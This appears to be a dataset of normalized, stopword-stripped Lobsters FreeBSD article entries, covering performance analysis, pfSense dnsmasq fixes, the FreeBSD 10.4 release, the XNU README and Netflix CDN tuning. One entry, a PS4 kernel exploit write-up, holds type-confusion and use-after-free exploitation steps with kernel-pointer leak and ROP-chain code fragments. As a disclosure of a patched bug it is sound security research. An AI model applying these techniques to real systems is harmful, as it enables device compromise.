netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollout trioconnectsendrightxrecv dragonfly goodx freebsd goodx haiku goodx hurd goodx linux goodx macos goodx minix goodx netbsd goodx openbsd goodx openindianaomnios goodx sortix goodx trioconnectsendwrongypoll dragonfly pollout freebsd pollout haiku pollout hurd pollout linux pollout macos pollout minix pollout netbsd pollout openbsd pollout openindianaomnios pollout sortix pollout trioconnectsendwrongyrecv dragonfly goodrecv ewouldblock freebsd goodrecv ewouldblock haiku goodrecv ewouldblock hurd goodrecv ewouldblock linux goodrecv ewouldblock macos goodrecv ewouldblock minix goodrecv ewouldblock netbsd goodrecv ewouldblock openbsd goodrecv ewouldblock openindianaomnios goodrecv ewouldblock sortix goodrecv ewouldblock trioconnectsendwrongysendrightxpoll dragonfly pollin pollout freebsd pollin pollout haiku pollin pollout hurd pollin pollout linux pollin pollout macos pollin pollout minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollout trioconnectsendwrongysendrightxrecv dragonfly goodx freebsd goodx haiku goodx hurd goodx linux goodx macos goodx minix goodx netbsd goodx openbsd goodx openindianaomnios goodx sortix goodx triosendrightxpoll dragonfly pollin pollout freebsd pollin pollout haiku pollin pollout hurd pollin pollout linux pollin pollout macos pollin pollout minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollout triosendrightxrecv dragonfly goodx freebsd goodx haiku goodx hurd goodx linux goodx macos goodx minix goodx netbsd goodx openbsd goodx openindianaomnios goodx sortix goodx triosendrightxsendwrongypoll dragonfly pollin pollout freebsd pollin pollout haiku pollin pollout hurd pollin pollout linux pollin pollout macos pollin pollout minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollout triosendrightxsendwrongyrecv dragonfly goodx freebsd goodx haiku goodx hurd goodx linux goodx macos goodx minix goodx netbsd goodx openbsd goodx openindianaomnios goodx sortix goodx triosendwrongyconnectpoll dragonfly pollin pollout freebsd pollin pollout haiku pollin pollout hurd pollin pollout linux pollin pollout macos pollin pollout minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollout triosendwrongyconnectrecv dragonfly bady freebsd bady haiku bady hurd bady linux bady macos bady minix bady netbsd bady openbsd bady openindianaomnios bady sortix goodrecv ewouldblock triosendwrongyconnectsendrightxpoll dragonfly pollin pollout freebsd pollin pollout haiku pollin pollout hurd pollin pollout linux pollin pollout macos pollin pollout minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollout triosendwrongyconnectsendrightxrecv dragonfly bady freebsd bady haiku bady hurd bady linux bady macos bady minix bady netbsd bady openbsd bady openindianaomnios bady sortix goodx unconnect dragonfly goodexit freebsd badunconnect eafnosupport haiku goodexit hurd goodexit linux goodexit macos badunconnect eafnosupport minix goodexit netbsd badunconnect eafnosupport openbsd badunconnect eafnosupport openindianaomnios badunconnect einval sortix goodexit unconnectgetpeername dragonfly goodgetpeername enotconn freebsd badunconnect eafnosupport haiku hurd goodgetpeername enotconn linux goodgetpeername enotconn macos badunconnect eafnosupport minix goodgetpeername enotconn netbsd badunconnect eafnosupport openbsd badunconnect eafnosupport openindianaomnios badunconnect einval sortix goodgetpeername enotconn unconnectgetsockname dragonfly nonzero freebsd badunconnect eafnosupport haiku nonzero hurd nonzero linux macos badunconnect eafnosupport minix netbsd badunconnect eafnosupport openbsd badunconnect eafnosupport openindianaomnios badunconnect einval sortix
428,Lobsters,freebsd,FreeBSD,EuroBSDcon: System Performance Analysis Methodologies,http://www.brendangregg.com/blog/2017-10-28/bsd-performance-analysis-methodologies.html,eurobsdcon system performance analysis methodology,eurobsdcon youtube slideshare freebsd performance checklist thread state analysis tstatesd cpu runq slp usl sus swp lck iwt yld,first trip paris gave closing keynote eurobsdcon performance methodology using freebsd analysis target past shared similar methodology applied operating system finished porting bsd talk day work really bad virtue methodology learn apply anything throughout career nt take much time reapply video youtube video slide slideshare freebsd excellent range analysis tool opportunity show among new content developed talk freebsd performance checklist uptime load average dmesg tail kernel error vmstat overall stats time vmstat p cpu balance p auxw process usage iostat xz disk io systat ifstat network io systat netstat tcp stats top process overview systat vmstat system overview also developed new tool support thread state analysis methodology freebsd tstatesd tstatesd tracing scheduler event ctrlc end c time m per state read script info comm pid cpu runq slp usl sus swp lck iwt yld sleep bufdaemon sleep devd syncer fsckufs fsck dd bufspacedaemon dtrace sh csh randharvestq kernel cam sshd intr cksum idle tool break thread time different state tracing scheduler event noticeable overhead measure lab environment use state cpu oncpu runq waiting cpu run queue slp interruptible sleep usl uninterruptible sleep eg disk io sus suspended swp swapped lck waiting lock iwt waiting interrupt yld yield added usl since talk split disk io sleep state output includes sleep command cksum eurobsdcon great conference lot fun catching bsd folk meeting new people missed talk see online hope find useful
429,Lobsters,freebsd,FreeBSD,"Extended attributes: the good, the not so good, the bad. (2014)",https://www.lesbonscomptes.com/pages/extattrs.html,extended attribute good good bad,freedesktop page,extended file attribute namevalue textual pair associated file describe beyond standard filesystem attribute provide linux bsd modern file system capability year mac o x apart minor interface difference feature work identically three system extended attribute valuable storing file metadata eg author john smith subject country landscape many case want store data file internal property however moment application use file extended attribute beagle used store data according freedesktop page seems rox apache currently use also dropbox see comment section likely explanation slow adoption still slightly reluctant support extended attribute found linux distribution general filesystem utility lot lag actual filesystem capability using extended attribute viable long good chance preserved common filesystem operation tool metadata precious want lose using wrong tool first wrote document glaring issue lack universally available crossplatform file archiver format would preserve extended attribute could find direct way create archive given type system wich would extractable two others standard tool eg create linux extract freebsd mac o x however thing changed since gnu bsd recent version tar support storing extended attribute use incompatible format easily available system major showstopper still minor inconvenient utility require nondefault argument store extract extended attribute another indication still somehow considered secondclass data lack nfs support big issue follows small inventory work us xattr abbreviation extended attribute notice error information could improve page please email jf dockesorg use comment section bottom
430,Lobsters,freebsd,FreeBSD,The First PS4 Kernel Exploit: Adieu,https://fail0verflow.com/blog/2017/ps4-namedobj-exploit/,first kernel exploit adieu,vulnerability discovery exploitation related macro byte uaf crafting finding uaf target putting together cleaning adieu chaitin tech,plenty time passed since first demonstrated linux running step back bit explain managed jump browser process kernel et al usable time firmware revision progressively added many mitigation general tried lock system post mainly touch vulnerability issue present latest release still useful people wanting investigate security vulnerability discovery previously explained able get dump firmware kernel via pcie maninthemiddle attack like freebsd kernel image included export symbol symbol required perform kernel module initialization process however kernel also included full elf symbol obviously oversight removed later firmware version oversight beneficial reverse engineering process although course true prerequisite indeed began exploring kernel examining builtin metadata form syscall handler table focusing entry recovering structure discovered large portion syscalls little wrapper essentially hash table api api expose following interface enum idttype idttypeeport idttypesblock idttypeevf idttypeosem idttypebudget idttypenamedobjdbg struct identry struct sx sxlock char name void ptr tid idttype kind isopen handle state struct idtbucket struct identry entry struct idtable struct idtbucket bucket struct mtx mutex numbuckets curhandle maxentries idtable idtablecreate int maxentries void idtabledestroy idtable idt int idalloc idtable idt identry ide void idset identry ide idttype kind void data char name void idsetopen identry ide idttype kind void data char name int idisopened identry ide void idfree idtable idt int handle identry ide void idunlock identry ide void idrlock idtable idt signed int index idttype kind identry ide void idrlockname idtable idt idttype kind char name identry ide void idwlock idtable idt signed int index idttype kind identry ide process object kernel contains idt id table object inferred snippet hash table essentially store pointer opaque data blob along given kind name entry may accessed thus locked either read write intent note idttype bitfield consisting unique power mean control kind identry may able cause type confusion occur assumed may control name sure enough kind may set usermode via namedobjcreate syscall struct namedobjusrt char name void object int sysnamedobjcreate struct thread td void args macroeperm rv ebx int kind idtable idt char name namedobjusrt rbx int handle identry ide rv einval qword args note almost completely usermodecontrolled kind dword args idt td tdproc sceidt name char malloc mname rv copyinstr const void args name rv free name mname else namedobjusrt malloc mname name name object qword args handle idalloc idt ide handle free name mname free mname rv eagain else idset ide idttype kind name idunlock ide td tdretval handle rv return rv need find way kernel access improperly use object process ie browser process idt kind plus number bit set found following code struct namedobjdbgt compilerinserted alignment int namedobjcreateex idtable idt char name namedobjdbgt noexists rax int rv identry ideexisting rv eagain noexists namedobjdbgt idrlockname idt idttypenamedobjdbg name ideexisting noexists noexists noexists noexists noexists noexists idunlock ideexisting rv unrelated code removed return rv accessible mdbgservice syscall struct char name int sysmdbgservice struct thread td void args signed int rv ebx void uptr rv uptr void qword args switch unsigned unsigned int args unrelated code removed case rv copyin uptr rv break rv namedobjcreateex td tdproc sceidt break unrelated code removed return rv using combination syscalls induce type confusion first calling namedobjcreate name haxplz kind cause kernel set pointer type namedobjusrt idt calling namedobjcreateex name haxplz cause kernel access pointer cast type namedobjdbgt exploitation exploiter without background might seem easiest way exploit bug would take advantage write end malloc namedobjusrt object however turn impossible far know side effect page size changed byte normal appears order change page size globally kernel developer opted directly change related macro one many change resulting smallest actual amount memory malloc may give back caller becomes byte also result ton memory completely wasted serve nullify certain exploitation technique likely completely uaf crafting way chosen exploit type confusion actually convert useafterfree scenario done help namedobjdelete syscall int sysnamedobjdelete struct thread td void args struct proc p rax idtable idt namedobjusrt int rv eax identry idout p td tdproc idt p sceidt namedobjusrt idwlock p sceidt dword args idttype word args idout rv esrch idfree idt dword args idout idunlock idout free name mname free mname rv return rv note type confusion allows u cast namedobjusrt object namedobjdbgt one update namedobjdbgt field allow u write end actual namedobjusrt object also allows writing lower namedobjusrtname pointer well namedobjusrt field fact may update lower namedobjusrtname actually blessing disguise although matter much post useafterfree primitive allows u free kernel address happens share top name mean choice malloc pointer free need somehow find pointer obviously pointer able used nice way free reallocate backing memory finding uaf target since first time working freebsd looked kernel object containing function pointer could somehow derive address browser process turn firmware incredibly easy sysctlbyname kernfile happily give various kernel address relating file object kernel us manage userspace file descriptor exploit code constructorprototypegetfiledescriptorkerneldataptr function fd var fdxfdata sysgetsysctlbyname kernfile function oldp oldlen var pid sysgetcurrentprocessid var filesize oldp lo var numfiles oldlen filesize var numfiles var xfpid oldpplus filesize var xffd oldpplus filesize var xfdata oldpplus filesize xfpid pid xffd fd fdxfdata xfdata return return fdxfdata et voilà kernel filefdata value fd control javascript type object pointed filefdata depends type file descriptor used kqueue met goal target object containing function pointer idea overwrite kqueue cause one function pointer within kq kqknlist knknlist executed point rop chain note kqknlist knknlist list name state standard pointer putting together another exploit excerpt finalize ropchain invoke constructorprototypetriggerkqueue function var fakefd callfunc symslibkernelkqueue lo var filep thisleaksgetfiledescriptorkerneldataptr fakefd var ropscratchlen var databuflen thiskqueuesizeof thisklistsizeof thisknotesizeof thisfilteropssizeof thisknlistsizeof thisjmpbufsizeof ropscratchlen var databuf allocategcmemory databuflen clearmemory databuf databuflen var fakekq databuf var kl fakekqplus thiskqueuesizeof var kn klplus thisklistsizeof var fop knplus thisknotesizeof var knl fopplus thisfilteropssizeof var jmpbuf knlplus thisknlistsizeof var ropscratch jmpbufplus thisjmpbufsizeof finalize ropchain thisemitreturnviajmpbuf jmpbuf create fake kq execute ropchain var ropstack thisropgetropstack jmpbufplus ropscratch rdi jmpbufplus rcx jmpbufplus gadgetsret next rip jmpbufplus ropstack rsp longjmptail need least stack slot push next rip onto knlplus gadgetsret kllock knlplus gadgetslongjmptail klunlock knlplus gadgetsret klassertlocked knlplus gadgetsret klassertunlocked knlplus jmpbuf kllockarg passed rdi funcptrs fop fisfd fopplus fevent ret knplus knl knknlist knplus thisevfiltread knfilter evfiltread knplus knstatus knqueued knplus fop knfop kl kn slhfirst kn thiswritefakemtx fakekqplus kqlock fakekqplus kqknlistsize fakekqplus kl kqknlist kl var change allocategcmemory thiskeventsizeof clearmemory change thiskeventsizeof changeplus thisevfiltread free try fill buffer cause used thiskernelfree filep thisioctlspray fakekq thiskqueuesizeof callfunc symslibkernelkevent fakefd change safe long injected code fixed corrupted kqueue callfunc symslibkernelclose fakefd shown creation kqueue object userspace get sprayed kernel performing uaf primitive via kernelfree simply calling ioctl spray executing syscall kevent fd relating corrupted file object cause kernel call kqueue object klunlock function pointer kick execution rop chain cleaning since exploit leaf corrupted file object browser file descriptor table first thing kernel payload actually remove corruption otherwise kernel eventually panic normally iterating process file descriptor table attempt close easily done following void fixcorruptedkqueue struct thread td method prevents kernel crashing time process sigsegv exiting blog note actually longer remember comment true always kexec directly linux nt matter struct filedesc fdp td tdproc pfd int fd fd fdp fdnfiles fd struct file fp fdp fdofiles fd fp fp ftype dtypekqueue struct kqueue kq fp fdata uintptrt kq kqknlist vmusermax found bad one kill slistremove fdp fdkqlist kq kqueue kqlist fdp fdofiles fd null fdp fdofileflags fd return fixcorruptedkqueue curthread adieu namedobj exploit present exploitable albeit using slightly different method described fixed firmware version vulnerability also found exploited least chaitin tech prop taking quick look kernel see straightforward fix assumed identical hand writing post int sysnamedobjcreate struct thread td void args rv einval kind dword args kind qword args unchanged return rv say goodbye nice exploit hope enjoyed blast past keep hacking
432,Lobsters,freebsd,FreeBSD,Fosdem 2018 BSD Devroom Call for Participation,https://people.freebsd.org/~rodrigo/fosdem18/,fosdem bsd devroom call participation,fosdem bsd devroom call participation key date practical submit talk fosdem pentabarf account creation,fosdem bsd devroom call participation key date conference date february brussels belgium devroom date saturday february submission deadline sunday november topic devroom includes bsd operating system every talk welcome hacker discussion realword example presentation new shiny feature practical default duration talk minute including discussion feel free ask want longer shorter slot presentation recorded streamed sending proposal implies giving permission recorded however exception made exceptional circumstance plan register proposal several track increase chance nt register talk accurate track bsd devroom first choice let u know give u chance save slot submit talk visit fosdem pentabarf website see account creation bellow create event click show top right corner display full form submission must include following information title subtitle talk please descriptive title listed project select bsd devroom track short abstract one paragraph longer description wish link related website blog etc account creation already pentabarf account please nt recreate new one forgot password reset follow instruction create account best regard bsd devroom organizer rodrigo osorio benny siegert
433,Lobsters,freebsd,FreeBSD,No Plan Survives Contact with the Internet,https://www.netgate.com/blog/no-plan-survives-contact-with-the-internet.html,plan survives contact internet,announced vulnerability discovered dnsmasq analyzing situation openvpn perl dnsmasq google published detailed analysis issue freebsd eol impact updating dnsmasq snapshot updating dnsmasq diagnostics command prompt one status service service dns forwarder save apply status system log dns resolver,release software version near originally hoped publish week however process halted could finish engaged process wrapping testing preparing release google announced vulnerability discovered dnsmasq part pfsense software base installation dnsmasq daemon longer used default new pfsense software installation user manually activated upgraded older system used default past continue rely dnsmasq top since release build started also update openvpn perl directly impacting base system also worth addressing given setback short version story stop rebuild release also mean fresh round testing set pfsense date back day new target october analyzing situation take moment discus security issue openvpn openvpn released version address present openvpn configuration attacker could exploit improperly tested value trigger stack buffer overflow gui openvpn client server pfsense control option relevant user said someone may entered directive advanced option area hand even default behavior openvpn replaced method openvpn released year ago keyword explicitly deprecated marked removal given low impact consider release blocker especially considering planned release pfsense within next month update openvpn client export package installers openvpn available shortly since package updated time perl perl released version address issue regular expression parsing latter could result memory content exposed part error message pfsense base installation us perl rrdtool input checked potential impact low package impacted could updated perl release update could brought needed later consider release blocker given timeline dnsmasq dnsmasq release address google published detailed analysis issue cve entry various problem including overflow information leak improper bound checking crash first three extremely critical lead remote code execution several bug potential denial service vector even though dnsmasq enabled default felt severe issue impacted enough user warrant stopping release process rebuilding user pfsense earlier concerned bug switch dns resolver unbound new pfsense software release available user earlier snapshot either switch unbound upgrade new snapshot correction date freebsd eol freebsd reach end life eol october month release freebsd past run release well past eol date variety reason requires u expend lot effort maintaining security patch prefer stay uptodate within official supported timeline freebsd base version impact original plan publish pfsense week using freebsd base work pfsense include freebsd base instead would enough time get pfsense release tested published freebsd hit eol date however due delay incurred restart build testing dnsmasq decided alter course plan changing pfsense freebsd base pushing release back date day allow testing testing image based freebsd internally user running pfsense snapshot based freebsd well confident enough time get enough useful feedback given circumstance addition change pfsense timeline also planning pfsense update address dnsmasq issue later date restarting public pfsense release candidate snapshot today freebsd base anyone tracking pfsense snapshot update test much possible given internal testing snapshot testing pfsense expect lowimpact beneficial change change nature caution warranted keep eye social medium account find new snapshot available appreciate help get community making sure best release yet updating dnsmasq snapshot perform update latest available snapshot includes updated dnsmasq package updating dnsmasq due severity dnsmasq problem made updated build dnsmasq available user component must updated manually update dnsmasq use either console shell diagnostics command prompt run following command installs latest version dnsmasq daemon associated file next verify update succeeded running following command output current version dnsmasq package status look like following output update successful uptodate remote change take effect dns forwarder dnsmasq service must restarted restarting service accomplished several way choose one following method restart dns forwarder service gui status service click restart icon service gui navigate service dns forwarder click save apply console ssh open shell prompt execute pfsshphp playback svc restart dnsmasq reboot firewall afterward visit status system log dns resolver tab check ensure new version started line similar one appear log oct dnsmasq started version cachesize user version pfsense older upgrade pfsense user earlier version pick new dnsmasq automatically performing online update pfsense
434,Lobsters,freebsd,FreeBSD,FreeBSD 10.4-RELEASE Announcement,https://www.freebsd.org/releases/10.4R/announce.html,freebsd announcement,freebsd announcement dedication availability http http taboverview download support acknowledgment trademark iso image checksum powerpc beaglebone cuboxhummingboard gumstix rpib pandaboard wandboard virtual machine disk image checksum donation,freebsd announcement freebsd release engineering team pleased announce availability freebsd fifth release branch building upon stability reliability introducing new feature highlight first freebsd release feature full support emmc storage including emmc partition trim bus speed mode please note though availability especially mode requires support actual sdhci frontend well hardware used also note sdhci controller part apollo lake chipsets affected several severe silicon bug apparently depends particular apollo lake platform whether workarounds place far sufficient avoid timeouts attaching sdhci also case gpt disk label used fsckffs utility able find alternate superblocks aesni driver longer share single fpu context across multiple session multiple thread addressing problem seen employing aesni accelerating ipsec support kaby lake generation device added em driver em driver capable enabling wake lan wol also chip note stale interface configuration previous unsuccessful attempt enable wol device actually take effect example ifconfig wol activates wol variant including wolmcast might undesirable support wol added igb driver able activate feature device remark regarding stale wol configuration em driver applies userland coredumps trigger event generating human readable crash report via devd feature default firmware shipping qlxgbe driver updated version additionally driver received tso locking fix performance optimization well sysctls providing mac rx tx statistic series adapter supported newly added driver openssh received update version gnome updated version xorgserver updated version much complete list new feature known problem please see online release note erratum list available information freebsd release engineering activity please see dedication freebsd project dedicates freebsd memory andrey chernov availability freebsd available powerpc architecture freebsd installed bootable iso image network architecture also support installing usb memory stick required file downloaded described section hash release iso memory stick sd card image included bottom message pgpsigned checksum release image also available pgpsigned version announcement available additional ueficapable image available architecture purpose image provided part release follows contains everything necessary install base freebsd operating system documentation small set prebuilt package aimed getting graphical workstation running also support booting livefs based rescue mode need burn use dvdsized medium contains base freebsd operating system also support booting livefs based rescue mode prebuilt package bootonly support booting machine using cdrom drive contain installation distribution set installing freebsd cd would need perform network based install eg http ftp server booting cd memstick written usb memory stick flash drive used install machine capable booting usb drive also support booting livefs based rescue mode prebuilt package one example use memstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct minimemstick written usb memory stick flash drive used boot machine contain installation distribution set medium similar bootonly image also support booting livefs based rescue mode prebuilt package one example use minimemstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct freebsdarm sd card image written sd card used boot supported arm system sd card image contains full freebsd installation installed onto sd card small convenience without console access system freebsd user password freebsd available default ssh access additionally root user password set root strongly recommended change password user gaining access system write freebsdarm image sd card use dd utility replacing kernel appropriate kernel configuration name system dd convsync careful make sure get target correct freebsd also purchased cdrom dvd several vendor one vendor offering freebsd product preinstalled virtual machine image also available architecture vhd vmdk disk image format well raw unformatted image freebsd also available cloud hosting platform amis available following region region region region region region region region region region region region region region region amis also available marketplace completed thirdparty specific validation http compute instance deployed using gcloud utility gcloud compute instance create instance image imageprojectfreebsdorgclouddev gcloud compute ssh instance replace instance name google compute engine instance instance deployed using vagrant utility vagrant init vagrant freebsd virtual machine image available completed thirdparty specific validation http taboverview download freebsd may downloaded via http following site freebsd virtual machine image may downloaded instruction installing freebsd updating existing machine please see support freebsd supported october expected final release freebsd release series additional support information found acknowledgment many company donated equipment network access manhours support release engineering activity freebsd including freebsd foundation yahoo netapp internet system consortium bytemark hosting sentex communication new york internet juniper network nlnet lab ixsystems yandex release engineering team includes trademark freebsd registered trademark freebsd foundation iso image checksum powerpc beaglebone cuboxhummingboard gumstix rpib pandaboard wandboard virtual machine disk image checksum love freebsd support future release donation freebsd foundation
435,Lobsters,freebsd,FreeBSD,EuroBSDcon 2017,https://www.youtube.com/playlist?list=PLo31Bhg3nNkb6jJF8OjxK81-ssAk250oa,eurobsdcon,,
436,Lobsters,freebsd,FreeBSD,Apple Open Sources XNU Kernel,https://github.com/apple/darwin-xnu,apple open source xnu kernel,xnu xnu source tree build xnu building kernel building fat kernel binary makefile option debug information format building kernelcaches running kernelcache target machine creating tag cscope coding style reindenting file webkit website clang doc install new header file xnu iokitiokitmakefile conditional compilation add new syscall testing kernel osfmktestsreadmemd toolstestsunittestsreadmemd kernel data descriptor libkddreadmemd debugging kernel readmemd,xnu xnu kernel part darwin operating system use macos io operating system xnu acronym x unix xnu hybrid kernel combining mach kernel developed carnegie mellon university component freebsd c api writing driver called iokit xnu run single processor multiprocessor configuration xnu source tree config configuration exported apis supported architecture platform setup basic set tool used configuring kernel versioning kextsymbol management externalheaders header sourced project avoid dependency cycle building header regularly synced source updated libkern c iokit library code handling driver kexts libsa kernel bootstrap code startup libsyscall syscall library interface userspace program libkdd source user library parsing kernel data like kernel chunked data makedefs top level rule defines kernel build osfmk mach kernel based subsystem pexpert platform specific code like interrupt handling atomics etc security mandatory access check policy interface related implementation bsd bsd subsystem code tool set utility testing debugging profiling kernel build xnu building development kernel xnu make system build kernel based kernelconfigs archconfigs variable argument syntax make sdkroot sdkroot archconfigs arch kernelconfigs variant sdkroot path macos sdk disk default variant debug development release profile configures compilation flag asserts throughout kernel code arch valid arch build eg build kernel architecture running o type make make sdkrootmacosxinternal additionally support configuring architecture archconfigs kernel configuration kernelconfigs make sdkrootmacosxinternal kernelconfigsdevelopment make sdkrootmacosxinternal kernelconfigs release development debug note default architecture set build machine architecture default kernel config set build development also create bootable image kernel config kernel binary symbol kernel config unstripped building fat kernel binary define architecture environment running make command make archconfigs exporthdrs makefile option make use process build default number active cpu make standard commandline option also accepted make w trace recursive make invocation useful combination verboseyes make build without llvm link time optimization make remotebuilduser remotehost perform build remote host make build clang json compilation database xnu build system optionally output colorformatted build output enable either set xnulogcolors environment variable pas logcolorsy make command debug information format default dwarf debug information repository created install phase bundle named kerneldevelopment variant dsym select older stab debug information format debug information embedded kerneldevelopmentunstripped image set buildstabs environment variable export make building kernelcaches test xnu kernel need build kernelcache link kexts kernel together single bootable image build kernelcache use following mechanism using automatic kernelcache generation kextd kextd daemon keep watching changing systemlibraryextensions directory setup new kernel cp systemlibrarykernels touch systemlibraryextensions p e grep kextd manually invoking kextcache build new kernelcache kextcache q z l n c vartmpkernelcachetest k vartmpkerneltest systemlibraryextensions running kernelcache target machine development kernel iboot support configuring boot argument safely boot test kernel thing go wrong safely fall back previously used kernelcache following step get setup create kernel cache using kextcache command kernelcachetest copy exiting boot configuration alternate file cp librarypreferencessystemconfigurationcomapplebootplist nextbootplist update kernelcache bootargs setup plutil insert kernel cache string kernelcachetest nextbootplist plutil replace kernel flag string v kernelsuffixtest nextbootplist copy new config librarypreferencessystemconfiguration cp nextbootplist librarypreferencessystemconfigurationbootplist bless volume new configs sudo n bless mount setboot nextonly option configboot nextonly flag specifies use bootplist configs one boot kernel panic easily power reboot recover back original kernel creating tag cscope set build environment top directory run make tag build ctags etags casesensitive volume ctags caseinsensitive make tag build etags make cscope build cscope database coding style reindenting file source file reindented using clangformat setup clangformat xnu follows variant webkit style source code formatting please refer format style webkit website option style option available clang doc note clangformat binary may part base installation compiled llvm clang source reachable path top directory run make reindent reindent source file using clang format install new header file xnu install iokit header see additional comment iokitiokitmakefile xnu installs header file following location dstroot systemlibraryframeworkskernelframeworkheaders b dstroot systemlibraryframeworkskernelframeworkprivateheaders c dstroot usrinclude dstroot systemlibraryframeworkssystemframeworkprivateheaders kernelframework used kernel extension systemframework usrinclude used user level application header file framework privateheaders available apple internal development directory containing header file makefile creates list file installed different location adding first header file directory need create makefile similar xnubsdsysmakefile add header file correct file list depending want install default location header file installed file list datafiles make header file available user level dstroot usrinclude b privatedatafiles make header file available apple internal user level dstroot systemlibraryframeworkssystemframeworkprivateheaders c kernelfiles make header file available kernel level dstroot systemlibraryframeworkskernelframeworkheaders dstroot systemlibraryframeworkskernelframeworkprivateheaders privatekernelfiles make header file available apple internal kernel extension dstroot systemlibraryframeworkskernelframeworkprivateheaders makefile combine file list mentioned different install list used build system install header file two type install list machinedependent machineindependent list indicated presence md mi build setting respectively header architecturespecific use machinedependent install list eg installmdlist header installed architecture use machineindependent install list eg installmilist install list interested exist create adding appropriate file list default install list member file list default location described installmilist installs header file location available everyone user level location dstroot usrinclude definition installmilist datafiles b installmilcllist installs header file location available apple internal user level location dstroot systemlibraryframeworkssystemframeworkprivateheaders definition installmilcllist privatedatafiles c installkfmilist installs header file location available everyone kernel extension location dstroot systemlibraryframeworkskernelframeworkheaders definition installkfmilist kernelfiles installkfmilcllist installs header file location available apple internal kernel extension location dstroot systemlibraryframeworkskernelframeworkprivateheaders definition installkfmilcllist kernelfiles privatekernelfiles e exportmilist export header file xnu bsd osfmk etc compilation install anything sdk definition exportmilist kernelfiles privatekernelfiles want install header file subdirectory path described specify directory name using two variable installmidir exportmidir follows installmidir dirname exportmidir dirname single header file exist different location using step mentioned however might desirable make code header file available location example want export function kernel level user level use c language preprocessor directive ifdef endif ifndef control text generated header file installed kernel includes code conditional macro true strip code false condition header file predefined macro description private defined enclosed definition considered system private interface visible within xnu exposed userkernel header installed within appleinternal privateheaders section system kernel framework b kernelprivate defined enclosed code available xnu kernel apple internal kernel extension omitted user header c bsdkernelprivate defined enclosed code visible exclusively within xnubsd module machkernelprivate defined enclosed code visible exclusively within xnuosfmk module e xnukernelprivate defined enclosed code visible exclusively within xnu f kernel defined enclosed code available within xnu kernel extension visible user level header file header file installed following path code dstroot systemlibraryframeworkskernelframeworkheaders dstroot systemlibraryframeworkskernelframeworkprivateheaders conditional compilation xnu offer following mechanism conditionally compiling code cpu characteristic code guarding specific characterstics vary based cpu architecture targeted use option prefer checking feature architecture eg littleendian etc b new feature code guarding taken together implement feature define new feature configmaster use resulting config preprocessor token eg feature named configvirtualmemory check configvirtualmemory practice ensures existing feature may brought platform simply changing feature switch c existing feature use existing feature code strongly tied eg use securekernel code implement new functionality exclusively relevant trusted kernel update definitionunderstanding trusted kernel mean recommended avoid compiling based target platform xnu define platform macro targetconditionalsh targetososx targetosios etc targetosembedded macro avoided general broad definition functionality add new syscall testing kernel xnu kernel multiple mechanism testing assertion development debug kernel configs compiled assertion enabled allows developer easily test invariant condition xnu power self test xnupost xnupost config allows building kernel basic set test function run first user space process launched since xnu hybrid mach bsd two location test added xnuosfmktests testing mach based kernel structure apis bsdtests testing bsd interface please follow documentation osfmktestsreadmemd user level test toolstests directory hold test verify syscalls feature xnu kernel make target xnutests used build test supported make rcprojectnamexnutests sdkrootpathtosdk test individual program run terminal report test status mean std posix exit code success andor stdout please read detailed documentation toolstestsunittestsreadmemd kernel data descriptor xnu us different data format passing data api standard way using syscall argument complex data often relies sending memory saved c structs packaged data transport mechanism fragile lead broken interface user space program kernel apis libkdd directory hold user space library parse custom data provided version kernel kernel chunked data format described detail libkddreadmemd debugging kernel xnu kernel support debugging remote kernel debugging protocol kdp please refer documentation technical note default kernel setup reboot panic debug live kernel kdp server setup listen udp connection ethernet machine without ethernet port behavior altered use kernel bootargs following common option setup debug variable start kdp debugserver panic v print kernel log screen default xnu show grey screen boot art override default port selection kdp supported ethernet thunderbolt serial debugging debug paniced kernel use llvm debugger lldb along unstripped symbol rich kernel binary sh lldb kerneldevelopmentunstripped connect paniced machine kdpremote ip addr gdbremote hostip port command kernel packaged kernel specific debug script part build process security reason special command script get loaded automatically lldb connected machine please add following setting lldbinit wish always load macro setting set targetloadscriptfromsymbolfile true toolslldbmacros directory contains source command please follow readmemd detailed explanation command usage
437,Lobsters,freebsd,FreeBSD,Netflix: Serving 100 Gbps from an Open Connect Appliance,https://medium.com/netflix-techblog/serving-100-gbps-from-an-open-connect-appliance-cdb51dda3b99,netflix serving gbps open connect appliance,serving gbps open connect appliance drew gallatin fake numa content popularity open connect flame graph nginx netflix contribute new sendfile freebsd pbufs proactive vm page scanning r assisted lro new goal tl gbps protecting netflix viewing privacy scale performance counter monitor tool intel vtune read modify write vtune driven optimization getting way mbuf page array yet,serving gbps open connect applianceby drew gallatinin summer netflix open connect cdn team decided take ambitious project goal leverage new network interface technology coming market order able serve gbps single freebsdbased open connect appliance oca using nvm express nvme based storageat time bulk flash storagebased appliance close cpu limited serving gbps using singlesocket xeon first step find cpu bottleneck existing platform waited newer cpu intel newer motherboards pcie slot could run new mellanox nics full speed system nvme drivesfake numanormally oca content served disk popular title served memory see previous blog content popularity open connect detail however early prenvme prototype limited disk bandwidth set contrived experiment served popular content test server allowed content fit ram therefore avoid temporary disk bottleneck surprisingly performance actually dropped cpu limited gbps cpu limited gbps basic profiling pmcstat flame graph suspected problem lock contention ran dtracebased lockstat lock profiling tool provided freebsd lockstat told u spending cpu time waiting lock freebsd inactive page queue happening get worse serving memory netflix oca serf large medium file using nginx via asynchronous sendfile system call see nginx netflix contribute new sendfile freebsd sendfile system call fetch content disk unless already memory one kb page time wrap network memory buffer mbuf pass network stack optional encryption transmission via tcp network stack release mbuf callback vm system cause page released page released either freed free page pool inserted list page may needed known inactive queue serving entirely memory nginx advising sendfile page would needed almost every page system went inactive queuethe problem inactive queue structured single list per nonuniform memory numa domain protected single mutex lock serving everything memory moved large percent page release activity free page pool already percpu free page cache thanks earlier work netflix randall stewart scott long jeff roberson team isilon matt macy inactive queue obvious fix would add percpu inactive page cache system still need able find page need page hashed pernuma queue predictable waythe ultimate solution came call fake numa approach take advantage fact one set page queue per numa domain lie system tell one fake numa domain every cpu lock contention nearly disappeared able serve gbps limited pcie slot substantial cpu idle timepbufsafter newer prototype machine intel xeon cpu pcie slot nic disk storage nvme sata ssd 